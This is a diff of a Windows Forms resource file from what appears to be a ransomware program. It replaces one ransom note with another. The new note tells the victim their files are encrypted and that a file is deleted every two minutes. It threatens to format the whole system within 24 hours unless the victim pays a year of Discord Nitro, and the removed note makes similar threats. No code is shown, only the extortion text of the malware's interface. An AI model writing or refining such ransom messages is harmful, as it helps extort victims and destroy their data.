@@ -117,11 +117,13 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <data name="richTextBox1.Text" xml:space="preserve">
-    <value>Hello there once again my love,
+  <data name="label3.Text" xml:space="preserve">
+    <value>Hello there, unfortunate person.
 
-Seems like you've triggered my bad side, I dont know why you have to rebel, my love for you is quite absolute, why do you have to be like that? I know I had to teach you a lesson.
-I have encrypted your files and in every 2 minutes a random file gets deleted, you have 6 days to pay, not being able to do so will result a system-wide format (that means, all your files gone).
-So please, if you may, don't be mad im just doing this for the sake of both of us...well?</value>
+All your files have been encrypted, yes, that includes your important documents and system files. I only ask one thing, a year's worth of Discord Nitro, it costs about 100$, it's not that much but enough for me to decrypt all your files and give them a little pat on the head just like nothing happened.
+
+In every 2 minutes a random file gets deleted. In 24 hours I will trigger a system-wide format, that means, all your files deleted. Don't try to rename the files or attempt to decrypt the 16,384 character key, you might get your files corrupted.
+
+All you have to do is buy Discord Nitro as a gift and put the key below, in about 5 minutes or so I'll send you your key. Make sure the Nitro's duration is 1 year, I wont accept 1 month.</value>
   </data>
 </root>
